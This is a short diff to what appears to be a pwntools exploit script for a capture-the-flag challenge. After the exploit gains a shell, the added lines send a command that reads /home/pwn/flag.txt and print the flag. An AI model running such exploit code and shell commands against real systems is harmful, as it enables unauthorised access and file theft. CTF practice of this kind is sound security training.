@@ -36,6 +36,9 @@ def main():
 
     log.success("Enjoy your shell!")
 
+    p.sendline(b"/bin/cat /home/pwn/flag.txt")
+    log.success(f"Flag: {p.recvline().strip().decode()}")
+
     p.interactive()
 
 
